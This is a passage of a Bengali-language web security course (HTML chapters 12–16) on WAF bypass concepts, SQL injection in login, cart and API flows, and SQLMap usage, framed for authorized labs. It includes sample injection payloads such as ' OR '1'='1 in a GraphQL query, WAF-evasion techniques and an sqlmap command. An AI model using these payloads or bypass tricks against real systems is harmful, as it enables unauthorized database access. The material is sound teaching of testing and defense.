+  <div class="callout danger"><div class="ic">⛔</div><p>এই অধ্যায়ের উদ্দেশ্য <strong>defensive security research</strong> — অর্থাৎ বোঝা যে কেন একটি WAF যথেষ্ট নয় এবং root-cause fix (parameterized query) কেন অপরিহার্য। এটি কোনো real-world WAF বাইপাস করে অননুমোদিত ডেটা বের করার নির্দেশিকা নয়। শুধুমাত্র নিজের তৈরি করা lab বা স্পষ্টভাবে অনুমোদিত পরিবেশে এই ধারণাগুলো প্র্যাকটিস করুন।</p></div>
+
+  <h2>WAF কী এবং কীভাবে কাজ করে</h2>
+  <p><strong>Web Application Firewall (WAF)</strong> হলো একটি নিরাপত্তা স্তর যা HTTP request পরীক্ষা করে এবং পরিচিত আক্রমণ-প্যাটার্নের (signature) সাথে মিললে request ব্লক করে দেয় — যেমন request-এ <code>UNION SELECT</code> বা <code>' OR '1'='1</code>-এর মতো টেক্সট থাকলে। WAF মূলত একটি <strong>pattern-matching স্তর</strong>, backend application বা database-এর প্রকৃত আচরণ সম্পর্কে এটির কোনো ধারণা নেই।</p>
+
+  <h2>WAF Detection বনাম Backend Vulnerability Confirmation</h2>
+  <p>একটি request WAF দ্বারা ব্লক হওয়া (যেমন ৪০৩ response) মানেই backend নিরাপদ তা প্রমাণ করে না — এটি শুধু বোঝায় যে request-টি WAF-এর signature-এর সাথে মিলেছে। বিপরীতভাবে, WAF bypass করে একটি request পাঠানো সফল হওয়াও মানেই backend vulnerable — এটিও আলাদাভাবে confirm করতে হবে (অধ্যায় ০৬-এর পদ্ধতিতে)।</p>
+
+  <h2>False Positives ও False Negatives</h2>
+  <p>WAF অতিরিক্ত কঠোর হলে স্বাভাবিক, নিরীহ ইনপুট (যেমন একজন ইউজারের নামে apostrophe, "O'Brien") ভুলভাবে ব্লক হতে পারে (false positive)। আবার WAF signature-ভিত্তিক হওয়ায় নতুন বা অস্বাভাবিক encoding ব্যবহার করা payload miss করে যেতে পারে (false negative)।</p>
+
+  <h2>Encoding ও Normalization-এর ধারণা</h2>
+  <div class="grid2">
+    <div class="card"><h4>URL ও Double Encoding</h4><p><code>'</code> → <code>%27</code> → (double-encoded) <code>%2527</code>। যদি WAF একবার decode করে পরীক্ষা করে কিন্তু backend দুইবার decode করে, তাহলে একটি mismatch তৈরি হতে পারে — এটি parser differences-এর একটি উদাহরণ, exploitation নির্দেশিকা নয়।</p></div>
+    <div class="card"><h4>Case Normalization</h4><p>কিছু সাধারণ signature case-sensitive হতে পারে (<code>UNION</code> বনাম <code>UniOn</code>) — যা দেখায় কেন signature-ভিত্তিক ডিটেকশন নিজে থেকে যথেষ্ট না, root-cause fix (parameterization) কেন প্রয়োজন।</p></div>
+    <div class="card"><h4>Whitespace Normalization</h4><p>Standard স্পেসের বদলে tab/newline/comment ব্যবহার — এটি দেখায় কেন pattern-matching ভঙ্গুর (brittle) একটি প্রতিরক্ষা কৌশল।</p></div>
+    <div class="card"><h4>Comments ও Parser Differences</h4><p>বিভিন্ন database parser comment/whitespace-কে ভিন্নভাবে ট্রিট করতে পারে — WAF ও backend database যদি আলাদা parser ব্যবহার করে, তাদের "বোঝা"-র মধ্যে পার্থক্য (parser differential) তৈরি হতে পারে।</p></div>
+  </div>
+
+  <h2>Unicode ও Character Normalization-এর ঝুঁকি</h2>
+  <p>কিছু Unicode ক্যারেক্টার normalization-এর পর সাধারণ ASCII ক্যারেক্টারে রূপান্তরিত হতে পারে (যেমন fullwidth quote)। যদি WAF normalization-এর আগে পরীক্ষা করে কিন্তু backend normalization-এর পরে ব্যবহার করে (বা উল্টো), তাহলে একটি গ্যাপ তৈরি হয় — এটি কেন ঘটে তা বোঝা defensive দিক থেকে গুরুত্বপূর্ণ, যাতে ডেভেলপার এবং WAF নিয়ম একই normalization logic ব্যবহার করে তা নিশ্চিত করা যায়।</p>
+
+  <h2>HTTP Parameter Pollution-এর ধারণা</h2>
+  <p>একই নামের parameter একাধিকবার পাঠানো হলে (<code>?id=1&id=2</code>), বিভিন্ন সার্ভার টেকনোলজি ভিন্নভাবে আচরণ করে — কেউ প্রথমটি নেয়, কেউ শেষেরটি, কেউ উভয়কে একত্র করে। যদি WAF একটি মান পরীক্ষা করে কিন্তু backend অন্যটি ব্যবহার করে, তাহলে একটি গ্যাপ তৈরি হতে পারে।</p>
+
+  <h2>JSON ও Content-Type Parsing Differences</h2>
+  <p>যদি WAF শুধু ফর্ম-এনকোডেড বডি পরীক্ষা করতে কনফিগার করা থাকে কিন্তু application JSON বডিও গ্রহণ করে, তাহলে JSON payload WAF-এর নজর এড়িয়ে যেতে পারে — এটি দেখায় WAF কনফিগারেশন কতটা content-type-aware হওয়া প্রয়োজন।</p>
+
+  <h2>Allowlist ও Denylist-এর সীমাবদ্ধতা</h2>
+  <p><strong>Denylist</strong> (নিষিদ্ধ শব্দের তালিকা) সবসময় অসম্পূর্ণ — নতুন encoding/syntax trick সবসময় সম্ভব। <strong>Allowlist</strong> (শুধু অনুমোদিত প্যাটার্নের তালিকা) তুলনামূলক শক্তিশালী কিন্তু ফ্রি-টেক্সট ফিল্ডে (যেমন সার্চ বক্স) প্রয়োগ করা কঠিন। এই কারণেই WAF কখনোই input validation-এর একমাত্র স্তর হওয়া উচিত না।</p>
+
+  <h2>WAF-এর সামনে ও পেছনে Parser Behavior কেন আলাদা হতে পারে</h2>
+  <p>WAF নিজের একটি সরলীকৃত SQL parser/regex ব্যবহার করে একটি request "SQL-এর মতো দেখতে" কি না বিচার করে, কিন্তু প্রকৃত database engine-এর নিজস্ব, অনেক বেশি জটিল ও সম্পূর্ণ parser থাকে। এই দুই parser-এর আচরণে পার্থক্যই (parser differential) root cause — এবং এই কারণেই prepared statements-কে primary defense হিসেবে গণ্য করা হয়, WAF-কে নয়।</p>
+
+  <h2>Authorized Lab-এ Controlled Bypass Experiment</h2>
+  <p>নিজের তৈরি করা একটি সাধারণ regex-ভিত্তিক filter (উদাহরণস্বরূপ, যা কেসের তফাত ছাড়া <code>union select</code> ব্লক করে) এবং একটি backend যা case-insensitive SQL চালায়, এই দুটি নিয়ে একটি ছোট lab তৈরি করে পরীক্ষা করুন কীভাবে case variation, comment insertion, বা encoding এই ধরনের সরল filter-কে বিভ্রান্ত করতে পারে — উদ্দেশ্য filter-এর দুর্বলতা বোঝা, production সিস্টেম আক্রমণ করা নয়।</p>
+
+  <h2>WAF Log Analysis</h2>
+  <p>WAF log পর্যালোচনা করে বোঝা যায় কোন ধরনের payload বেশি চেষ্টা করা হচ্ছে, কোন endpoint সবচেয়ে বেশি টার্গেট হচ্ছে, এবং কোন নিয়ম ঘন ঘন trigger হচ্ছে (যা false positive rate নির্দেশ করতে পারে) — এটি defensive টিমের জন্য গুরুত্বপূর্ণ ফিডব্যাক লুপ।</p>
+
+  <h2>Defensive Bypass Testing Checklist</h2>
+  <div class="card">
+    <ul>
+      <li>☐ WAF নিয়ম encoding-independent (normalize করার পর পরীক্ষা করে) কি না?</li>
+      <li>☐ WAF ও backend একই content-type গুলো পরীক্ষা করে কি না (JSON সহ)?</li>
+      <li>☐ HTTP parameter pollution-এর ক্ষেত্রে WAF ও backend একই মান ব্যবহার করে কি না?</li>
+      <li>☐ WAF ব্যর্থ হলেও backend-এ parameterized query দিয়ে root-cause সুরক্ষা আছে কি না?</li>
+    </ul>
+  </div>
+
+  <h2>WAF Bypass ঠেকানোর সঠিক পদ্ধতি</h2>
+  <p>সবচেয়ে গুরুত্বপূর্ণ নীতি: <strong>WAF কখনোই SQLi-এর primary defense হওয়া উচিত না।</strong> এটি একটি অতিরিক্ত detection/alerting স্তর হিসেবে কার্যকর (defense-in-depth), কিন্তু প্রকৃত সুরক্ষা আসে parameterized query ও secure coding অভ্যাস থেকে (অধ্যায় ১৭)। WAF নিয়মিত আপডেট করা, একাধিক normalization layer-এ সামঞ্জস্যপূর্ণ আচরণ নিশ্চিত করা, এবং backend validation-এর সাথে coordinate করা ভালো অভ্যাস।</p>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>WAF একটি pattern-matching স্তর, root-cause fix নয়। Encoding, normalization, parameter pollution ও content-type পার্থক্য থেকে WAF ও backend-এর মধ্যে "parser differential" তৈরি হতে পারে — এই ধারণা বোঝা গুরুত্বপূর্ণ যাতে ডেভেলপার ও সিকিউরিটি টিম প্রকৃত root-cause (parameterized query)-কে অগ্রাধিকার দেয়, WAF-কে চূড়ান্ত সমাধান না ভেবে।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>কেন একটি request WAF-এ ব্লক হওয়া মানেই backend নিরাপদ নয়?</li>
+    <li>Denylist-ভিত্তিক WAF নিয়মের মূল সীমাবদ্ধতা কী?</li>
+    <li>Parser differential ধারণাটি কেন গুরুত্বপূর্ণ?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter11"><span>পূর্ববর্তী</span>অধ্যায় ১১</a>
+    <a class="next" href="/chapter13"><span>পরবর্তী</span>অধ্যায় ১৩ — Authentication ও Business Logic</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch13">
+  <div class="eyebrow">অধ্যায় ১৩ · অ্যাডভান্সড</div>
+  <h1>Authentication ও Business Logic</h1>
+  <p class="sub">লগইন, পাসওয়ার্ড রিসেট, কার্ট, ও multi-step workflow-তে SQLi-এর সম্পর্ক, এবং এটিকে সাধারণ business-logic bug থেকে আলাদা করা।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch13" id="done-ch13"><label for="done-ch13">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Login Bypass-এর Underlying SQL Concepts</h2>
+  <p>অধ্যায় ০২-এ দেখানো <code>' OR '1'='1</code> প্যাটার্নটি login bypass-এর একটি ক্লাসিক (কিন্তু সরলীকৃত) উদাহরণ। বাস্তব অ্যাপ্লিকেশনে password hashing ব্যবহৃত হলে এই নির্দিষ্ট আক্রমণ সরাসরি কাজ নাও করতে পারে — নিচে ব্যাখ্যা করা হলো কেন।</p>
+
+  <h2>Password Hashing কেন SQLi থেকে আলাদা বিষয়</h2>
+  <p>যদি backend query <code>WHERE username = ? AND password_hash = ?</code> (parameterized) ব্যবহার করে এবং password যাচাইয়ের আগে hash করে, তাহলে এমনকি vulnerable string-concatenation query হলেও, attacker-এর <code>' OR '1'='1</code> প্যাটার্ন password ফিল্ডের hash comparison-কে "bypass" করতে পারে যদি পুরো <code>WHERE</code> ক্লজ true হয়ে যায় — কিন্তু এটি password hash "ভাঙা" নয়, বরং পুরো query logic-কে override করা। Hashing নিজে থেকে SQLi থেকে রক্ষা করে না; parameterization করে।</p>
+
+  <h2>Authentication Query ও Authorization Checks</h2>
+  <p>অনেক অ্যাপ্লিকেশনে authentication (পরিচয় যাচাই) এবং authorization (role/permission যাচাই) আলাদা query-তে হয়। যদি authentication query injectable হয়, তাহলে attacker username/password যাচাই bypass করতে পারে, কিন্তু role এখনো database-এর আসল মান থেকে আসতে পারে — ফলে bypass সফল হলেও attacker "admin" role নাও পেতে পারে, যদি না role-নির্ধারণ query-ও একইভাবে প্রভাবিত হয়।</p>
+
+  <h2>Role-Based Access Control-এর সঙ্গে SQLi-এর সম্পর্ক</h2>
+  <p>যদি একটি UNION-based SQLi দিয়ে attacker <code>role</code> কলামের মান নিজের ইচ্ছামতো response-এ "বসাতে" পারে (যেমন একটি profile page যা session থেকে না, সরাসরি query থেকে role দেখায়), তাত্ত্বিকভাবে এটি privilege escalation-এর একটি পথ খুলে দিতে পারে — যদিও বাস্তব exploitation নির্ভর করে application ঠিক কোথায়, কীভাবে সেই role ব্যবহার করছে তার উপর।</p>
+
+  <h2>Password Reset Workflow</h2>
+  <p>পাসওয়ার্ড রিসেট ফিচারে সাধারণত email/username দিয়ে একটি ইউজার lookup query চলে এবং একটি token generate/store হয়। যদি email ফিল্ড injectable হয়, তাহলে token generation লজিক bypass নাও হতে পারে, কিন্তু lookup query দিয়ে অন্য ইউজারের তথ্য ফাঁস হতে পারে (যেমন UNION-based দিয়ে)।</p>
+
+  <h2>OTP ও Account Recovery</h2>
+  <p>OTP (One-Time Password) যাচাইয়ের query-ও (<code>WHERE user_id = ? AND otp_code = ?</code>) একইভাবে vulnerable হতে পারে যদি parameterized না হয় — যদিও OTP-এর স্বল্প মেয়াদ (expiry) exploitation window সীমিত করে।</p>
+
+  <h2>Shopping Cart ও Order Data</h2>
+  <p>Cart-এ থাকা <code>product_id</code>, <code>quantity</code> সাধারণত numeric context — কিন্তু "apply coupon" জাতীয় ফিচারে string input (<code>coupon_code</code>) ব্যবহৃত হয়, যা একটি সম্ভাব্য injection point।</p>
+
+  <h2>Price ও Quantity Validation — Business Logic বনাম SQLi</h2>
+  <p>যদি একজন attacker quantity ফিল্ডে <code>-1</code> দিয়ে মোট মূল্য ঋণাত্মক করার চেষ্টা করে, এটি সাধারণত একটি <strong>business-logic bug</strong> (input validation-এর ঘাটতি), SQL injection নয় — কারণ এখানে SQL query-এর গঠন পরিবর্তিত হচ্ছে না, শুধু একটি অবৈধ কিন্তু সিনট্যাক্টিকভাবে সঠিক মান গ্রহণ করা হচ্ছে।</p>
+
+  <h2>Multi-Step Workflow ও Second-Order SQLi</h2>
+  <p>একটি checkout প্রক্রিয়ায় ধাপ ১-এ দেওয়া ডেটা (যেমন shipping address-এর একটি ফ্রি-টেক্সট নোট) যদি সংরক্ষিত হয় এবং ধাপ ৩-এর invoice-generation query-তে পরে ব্যবহৃত হয়, তাহলে এটি second-order SQLi-এর সম্ভাব্য ক্ষেত্র। এই ধরনের workflow টেস্ট করার সময় প্রতিটি ধাপে ডেটা কোথায় "পুনরায় ব্যবহৃত" হচ্ছে তা ম্যাপ করা জরুরি।</p>
+
+  <h2>Database Query Vulnerability বনাম সাধারণ Business Logic Bug — কীভাবে আলাদা করবেন</h2>
+  <table>
+    <thead><tr><th>প্রশ্ন</th><th>SQLi-এর দিকে ইঙ্গিত</th><th>Business logic bug-এর দিকে ইঙ্গিত</th></tr></thead>
+    <tbody>
+      <tr><td>Input-এ quote/SQL metacharacter পাঠালে আচরণ বদলায়?</td><td>হ্যাঁ</td><td>না (শুধু range/type validation প্রভাবিত হয়)</td></tr>
+      <tr><td>Error message SQL syntax উল্লেখ করে?</td><td>হ্যাঁ</td><td>না</td></tr>
+      <tr><td>সমস্যাটি শুধু অস্বাভাবিক কিন্তু বৈধ-ফরম্যাটের মান দিয়ে ঘটে (যেমন ঋণাত্মক সংখ্যা)?</td><td>না</td><td>হ্যাঁ</td></tr>
+    </tbody>
+  </table>
+
+  <div class="exercise"><h4>অনুশীলন</h4><p>একটি authorized lab checkout ফ্লোতে, প্রতিটি ধাপে কোন ডেটা সংরক্ষিত হচ্ছে এবং পরবর্তী কোন ধাপে তা পুনরায় ব্যবহৃত হতে পারে তার একটি ম্যাপ তৈরি করুন, এবং প্রতিটি পয়েন্টে second-order risk আছে কি না মূল্যায়ন করুন।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Authentication, password reset, cart, ও multi-step workflow-এর প্রতিটিই আলাদা query তৈরি করে, এবং প্রতিটিতেই আলাদাভাবে injectability যাচাই করা দরকার। SQLi ও সাধারণ business-logic bug-এর মধ্যে পার্থক্য করার মূল চাবিকাঠি হলো — আচরণ পরিবর্তনের কারণ কি SQL syntax, নাকি শুধু মানের সীমা/বৈধতা।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>Password hashing কেন SQLi-কে পুরোপুরি ঠেকায় না?</li>
+    <li>কার্টে quantity=-1 পাঠানো কেন সাধারণত SQLi নয়?</li>
+    <li>Second-order SQLi শনাক্ত করতে multi-step workflow ম্যাপ করা কেন জরুরি?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter12"><span>পূর্ববর্তী</span>অধ্যায় ১২</a>
+    <a class="next" href="/chapter14"><span>পরবর্তী</span>অধ্যায় ১৪ — API SQL Injection</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch14">
+  <div class="eyebrow">অধ্যায় ১৪ · অ্যাডভান্সড</div>
+  <h1>API SQL Injection</h1>
+  <p class="sub">REST ও GraphQL API-তে SQLi টেস্টিং — JSON body, query/path parameter, pagination, ও authorization।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch14" id="done-ch14"><label for="done-ch14">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>API Request ও Response Fundamentals</h2>
+  <p>একটি API endpoint সাধারণত নির্দিষ্ট HTTP method (GET/POST/PUT/DELETE), একটি path, এবং JSON/XML বডি ব্যবহার করে। SQLi-এর দৃষ্টিকোণ থেকে, যেকোনো মান যা backend-এ একটি database query-তে পৌঁছায় তা সম্ভাব্য ইনজেকশন পয়েন্ট — এটি path parameter, query string, বা body — যেকোনো জায়গায় হতে পারে।</p>
+
+  <h2>REST API-তে Parameter Testing</h2>
+  <div class="codeblock"><div class="cb-head"><span>Path ও query parameter</span><button class="copy-btn">কপি</button></div><pre><code>GET /api/v1/users/42              → path parameter: 42
+GET /api/v1/orders?status=shipped → query parameter: status</code></pre></div>
+  <p>Path parameter-এ quote পাঠাতে হলে URL-encode করতে হবে (<code>/api/v1/users/42%27</code>), কারণ কাঁচা quote URL path-এ সমস্যা তৈরি করতে পারে ভিন্ন কারণে (routing error)।</p>
+
+  <h2>JSON Body Testing</h2>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>POST /api/v1/search
+Content-Type: application/json
+
+{"query": "laptop", "minPrice": 100, "maxPrice": 2000}</code></pre></div>
+  <p>প্রতিটি key আলাদাভাবে পরীক্ষা করুন। সংখ্যা-নির্ভর field (<code>minPrice</code>) numeric context, string field (<code>query</code>) string context হতে পারে — অধ্যায় ০২-এর context আলোচনা এখানেও প্রযোজ্য।</p>
+
+  <h2>Sorting/Filtering Parameter ও Pagination/Search Endpoint</h2>
+  <p>API-তে প্রায়ই <code>?sort=price&limit=20&offset=0</code>-এর মতো parameter থাকে — এগুলো অধ্যায় ০৪-এ আলোচিত ঝুঁকিপূর্ণ ক্ষেত্রগুলোর API-সংস্করণ।</p>
+
+  <h2>Authentication Token বনাম SQL Query Input</h2>
+  <p>একটি API token (JWT/Bearer token) সাধারণত সরাসরি SQL query-তে ব্যবহৃত হয় না — এটি cryptographically যাচাই হয়। কিন্তু token-এর ভেতরের decoded claim (যেমন <code>user_id</code>) যদি backend পরবর্তী কোনো raw query-তে ব্যবহার করে, তাহলে সেটিও একটি ইনজেকশন পয়েন্ট হতে পারে — যদিও token নিজে পরিবর্তন করা (স্বাক্ষর ভাঙা ছাড়া) সাধারণত সম্ভব না।</p>
+
+  <h2>API Error Handling</h2>
+  <p>অনেক API framework ডিফল্টভাবে JSON আকারে structured error ফেরত দেয় (যেমন <code>{"error": "Internal Server Error"}</code>), যা ঐতিহ্যবাহী HTML error page-এর চেয়ে কম তথ্য প্রকাশ করে — ফলে error-based SQLi detection তুলনামূলক কঠিন হতে পারে, এবং blind কৌশলের উপর বেশি নির্ভর করতে হতে পারে।</p>
+
+  <h2>Mass Assignment ও SQLi-এর পার্থক্য</h2>
+  <p><strong>Mass assignment</strong> তখন ঘটে যখন একটি API এন্ডপয়েন্ট request body-এর সব ফিল্ড (এমনকি যেগুলো ইউজারের পরিবর্তন করার কথা না, যেমন <code>role: "admin"</code>) সরাসরি database object-এ map করে দেয় — এটি একটি authorization/data-binding সমস্যা, SQL syntax-ভিত্তিক সমস্যা নয়। দুটি ভিন্ন vulnerability হলেও উভয়ই "অতিরিক্ত বিশ্বাস করা input"-এর একই মূল সমস্যা থেকে আসে।</p>
+
+  <h2>GraphQL Resolver-এর Database Interaction</h2>
+  <div class="codeblock"><div class="cb-head"><span>GraphQL query উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>query {
+  products(filter: { category: "electronics' OR '1'='1" }) {
+    id
+    name
+  }
+}</code></pre></div>
+  <p>GraphQL নিজে একটি query language হলেও এটি SQL নয় — GraphQL layer-এর resolver ফাংশন যদি internally string concatenation দিয়ে SQL বানায়, তাহলে ঠিক একই root cause-এ SQLi ঘটতে পারে। GraphQL schema-এর কড়াকড়ি (strict typing) কিছু ক্ষেত্রে (যেমন <code>Int</code> টাইপ আর্গুমেন্ট) injection কঠিন করে তোলে, কিন্তু free-text <code>String</code> আর্গুমেন্টে ঝুঁকি থেকেই যায়।</p>
+
+  <h2>API Authorization ও Scope</h2>
+  <p>API টেস্ট করার সময় নিশ্চিত হোন যে আপনার token/API key-এর scope টেস্টিং-এর জন্য অনুমোদিত — অনেক bug bounty প্রোগ্রাম নির্দিষ্ট API scope বা rate limit নির্ধারণ করে দেয়।</p>
+
+  <h2>Safe API Testing Workflow</h2>
+  <ol>
+    <li>API ডকুমেন্টেশন (OpenAPI/Swagger, GraphQL schema) পর্যালোচনা করে সব endpoint ও parameter তালিকাভুক্ত করুন।</li>
+    <li>Burp দিয়ে প্রতিটি request ক্যাপচার করুন (GraphQL-এর জন্য Burp-এর GraphQL-aware ফিচার ব্যবহার করা যায়)।</li>
+    <li>অধ্যায় ০৬-এর methodology অনুসরণ করুন — baseline, controlled change, তুলনা।</li>
+  </ol>
+
+  <div class="codeblock"><div class="cb-head"><span>Sample request/response জোড়া</span><button class="copy-btn">কপি</button></div><pre><code>Request:  GET /api/v1/orders?status=shipped' HTTP/1.1
+Response: HTTP/1.1 500 Internal Server Error
+          {"error": "invalid input syntax"}
+→ structured error, কিন্তু তাও database engine-এর সংকেত দিতে পারে।</code></pre></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>API-তে SQLi-এর মূলনীতি একই, কিন্তু JSON/GraphQL-এর কাঠামো, structured error handling, এবং authentication token-এর উপস্থিতি টেস্টিং পদ্ধতিতে কিছু বিশেষ বিবেচনা যোগ করে। Mass assignment একটি ভিন্ন কিন্তু সম্পর্কিত ঝুঁকি, যা SQLi থেকে আলাদা করে বোঝা উচিত।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>GraphQL-এর strict typing কীভাবে কিছু ইনজেকশন ঝুঁকি কমায়?</li>
+    <li>Mass assignment ও SQLi-এর মূল পার্থক্য কী?</li>
+    <li>API-তে structured JSON error কেন error-based SQLi detection কঠিন করে তুলতে পারে?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter13"><span>পূর্ববর্তী</span>অধ্যায় ১৩</a>
+    <a class="next" href="/chapter15"><span>পরবর্তী</span>অধ্যায় ১৫ — SQLi Automation ও Tooling</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch15">
+  <div class="eyebrow">অধ্যায় ১৫ · অ্যাডভান্সড</div>
+  <h1>SQLi Automation ও Tooling</h1>
+  <p class="sub">Manual বনাম automated scanning, SQLMap-এর ধারণাগত পরিচিতি, এবং tool output-কে নির্ভরযোগ্য প্রমাণে রূপান্তর করা।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch15" id="done-ch15"><label for="done-ch15">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <div class="callout warn"><div class="ic">⚠️</div><p>Automation examples কেবলমাত্র নিজের local lab, training environment, অথবা স্পষ্টভাবে অনুমোদিত target-এর জন্য ব্যবহার করুন। Automated টুল দ্রুত বহু request পাঠায়, যা অননুমোদিত সিস্টেমে চালালে আইনি ঝুঁকির পাশাপাশি সার্ভিস বিঘ্নিত করারও ঝুঁকি তৈরি করে।</p></div>
+
+  <h2>Manual Testing কখন বেশি কার্যকর</h2>
+  <p>Second-order SQLi, জটিল multi-step workflow, কাস্টম authentication, বা business-logic-নির্ভর context-এ manual testing প্রায়ই automated scanner-এর চেয়ে ভালো ফল দেয় — কারণ এটি application-এর প্রকৃত প্রবাহ বোঝে, যেখানে scanner প্রতিটি parameter স্বতন্ত্রভাবে ট্রিট করে।</p>
+
+  <h2>Automated Scanner-এর সুবিধা ও সীমাবদ্ধতা</h2>
+  <table>
+    <thead><tr><th>সুবিধা</th><th>সীমাবদ্ধতা</th></tr></thead>
+    <tbody>
+      <tr><td>অনেক parameter দ্রুত কভার করা যায়</td><td>Context বোঝে না — false positive/negative তৈরি করতে পারে</td></tr>
+      <tr><td>পরিচিত payload pattern ধারাবাহিকভাবে পরীক্ষা করে</td><td>Multi-step/second-order SQLi সহজে মিস করে</td></tr>
+      <tr><td>Fingerprinting স্বয়ংক্রিয়ভাবে করতে পারে</td><td>WAF/rate-limit থাকলে ফলাফল অনির্ভরযোগ্য হতে পারে</td></tr>
+    </tbody>
+  </table>
+
+  <h2>SQLMap কী এবং কখন ব্যবহার করা উচিত</h2>
+  <p>SQLMap একটি ওপেন-সোর্স automated SQL injection detection ও exploitation টুল, যা একটি নির্দিষ্ট request (URL বা raw HTTP request ফাইল) দিয়ে প্রায় সব পরিচিত SQLi কৌশল (boolean, error, union, time-based, stacked) নিয়মতান্ত্রিকভাবে পরীক্ষা করে। এটি ব্যবহার করা উচিত যখন <strong>ইতিমধ্যে manual পরীক্ষায় injection-এর প্রাথমিক ইঙ্গিত পাওয়া গেছে</strong> এবং আরও নিয়মতান্ত্রিক, বিস্তারিত বিশ্লেষণ দরকার — শুরু থেকেই "scan and forget" পদ্ধতিতে ব্যবহার করা উচিত নয়।</p>
+
+  <h2>Authorized Lab-এ Basic Usage Concepts</h2>
+  <div class="codeblock"><div class="cb-head"><span>ধারণাগত কমান্ড কাঠামো (শুধুমাত্র নিজের lab-এ)</span><button class="copy-btn">কপি</button></div><pre><code># একটি Burp দিয়ে সংরক্ষিত raw request ফাইল থেকে স্ক্যান করা
+sqlmap -r saved_request.txt --batch --level=2 --risk=1
+
+# --batch: প্রতিটি প্রশ্নে ডিফল্ট উত্তর নেয় (unattended মোডে চলার জন্য)
+# --level/--risk: কতটা গভীর ও ঝুঁকিপূর্ণ টেস্ট চালানো হবে তা নিয়ন্ত্রণ করে</code></pre></div>
+  <p>উচ্চ <code>--risk</code> লেভেলে কিছু payload ডেটা পরিবর্তনকারী হতে পারে — তাই এগুলো শুধুমাত্র নিজের isolated lab-এ ব্যবহার করা উচিত, কখনো shared বা production ডেটাবেসে নয়।</p>
+
+  <h2>Detection Output Interpretation</h2>
+  <p>SQLMap "parameter 'id' is vulnerable" বলে রিপোর্ট করলেও, এর মানে হলো এটি একটি নির্দিষ্ট প্যাটার্নে response পার্থক্য পেয়েছে — এটিকে অন্ধভাবে বিশ্বাস না করে, নিজে manually সেই request পাঠিয়ে (অধ্যায় ০৬-এর পদ্ধতিতে) যাচাই করা উচিত।</p>
+
+  <h2>False Positives</h2>
+  <p>Rate limiting, dynamic content, বা network jitter থাকলে SQLMap ভুল সিদ্ধান্তে পৌঁছাতে পারে, বিশেষ করে time-based টেস্টে। <code>--technique</code> ফ্ল্যাগ দিয়ে শুধু নির্দিষ্ট কৌশল (যেমন শুধু boolean-based) চালিয়ে ফলাফল আরও নিয়ন্ত্রিত রাখা যায়।</p>
+
+  <h2>Request Rate Control</h2>
+  <p><code>--delay</code> ও <code>--threads</code> প্যারামিটার দিয়ে request-এর গতি নিয়ন্ত্রণ করা যায় — authorized টেস্টিং-এও target সার্ভারে অতিরিক্ত লোড এড়াতে এটি গুরুত্বপূর্ণ।</p>
+
+  <h2>Manual Confirmation</h2>
+  <p>Tool যা শনাক্ত করেছে তার একটি ছোট অংশ (যেমন শুধু database version) নিজে Burp Repeater দিয়ে reproduce করে দেখুন — এটি নিশ্চিত করে যে ফলাফল tool-এর কোনো bug বা ভুল ব্যাখ্যা নয়।</p>
+
+  <h2>Tool Output থেকে Report Evidence তৈরি করা</h2>
+  <p>SQLMap-এর সম্পূর্ণ verbose লগ রিপোর্টে কপি-পেস্ট না করে, শুধু প্রাসঙ্গিক request/response জোড়া এবং সংক্ষিপ্ত ব্যাখ্যা উদ্ধৃত করুন — পাঠক (triager) হিসেবে প্রোগ্রামের রিভিউয়ারের জন্য এটি অনেক বেশি কার্যকর (অধ্যায় ১৯)।</p>
+
+  <h2>কেন Tool Output একাই Final Proof নয়</h2>
+  <p>একটি automated টুলের "vulnerable" লেবেল কোনো বাইন্ডিং প্রমাণ নয় — এটি একটি hypothesis, যা manual verification, reproducibility যাচাই, এবং impact assessment দিয়ে confirm করতে হয় মানবিক বিচার দিয়ে, শুধু টুলের আউটপুটের উপর নির্ভর করে নয়।</p>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>Automated টুল (যেমন SQLMap) দ্রুত ব্যাপক কভারেজ দেয়, কিন্তু context-blind এবং false positive/negative-এর ঝুঁকিতে ভোগে। Manual verification, নিয়ন্ত্রিত request rate, এবং সুনির্দিষ্ট evidence তৈরি — এই তিনটিই responsible automation-এর মূল স্তম্ভ।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter14"><span>পূর্ববর্তী</span>অধ্যায় ১৪</a>
+    <a class="next" href="/chapter16"><span>পরবর্তী</span>অধ্যায় ১৬ — SQL Injection Impact</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch16">
+  <div class="eyebrow">অধ্যায় ১৬ · অ্যাডভান্সড</div>
+  <h1>SQL Injection Impact</h1>
+  <p class="sub">Confidentiality, integrity, availability এবং বাস্তবসম্মত business impact assessment।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch16" id="done-ch16"><label for="done-ch16">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Confidentiality, Integrity ও Availability (CIA Triad)</h2>
+  <div class="grid2">
